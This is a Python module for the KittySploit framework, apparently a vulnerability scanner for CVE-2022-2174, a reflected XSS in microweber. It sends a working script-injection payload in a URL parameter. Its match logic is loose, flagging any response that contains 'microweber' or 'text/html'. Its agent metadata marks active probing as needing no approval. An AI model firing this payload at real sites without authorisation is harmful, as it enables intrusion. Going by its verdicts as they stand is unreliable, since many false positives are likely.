#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cross-site Scripting (XSS) - Reflected in GitHub repository microweber/microweber prior to 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'microweber 1.2.18 - Cross-site Scripting Detection',
        'description': 'Cross-site Scripting (XSS) - Reflected in GitHub repository microweber/microweber prior to 1.2.18.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'huntr', 'microweber', 'xss', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/ac68e3fc-8cf1-4a62-90ee-95c4b2bad607/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-2174',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-2174',
            'https://www.tenable.com/cve/CVE-2022-2174',
            'https://github.com/microweber/microweber/commit/c51285f791e48e536111cd57a9544ccbf7f33961',
        ],
        'cve': 'CVE-2022-2174',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/module?type=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&live_edit=true&from_url=test', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<script>alert(document.domain)</script>', 'microweber', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="microweber 1.2.18 - Cross-site Scripting detected",
                path='/api/module?type=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&live_edit=true&from_url=test',
            )
            return True
        return False

